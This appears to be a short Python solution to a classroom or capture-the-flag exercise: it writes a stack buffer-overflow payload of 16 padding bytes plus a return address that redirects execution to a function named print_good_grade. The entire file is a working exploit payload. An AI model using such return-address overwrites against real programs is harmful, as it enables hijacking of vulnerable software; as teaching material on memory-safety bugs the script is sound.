import sys
from struct import pack

# found print_good_grade starting address from its assembly 
# found padding via trial and error to overwrite return address to print_good_grade
payload = b'\x41' * 16 + pack('<I', 0x804a25d)

sys.stdout.buffer.write(payload)
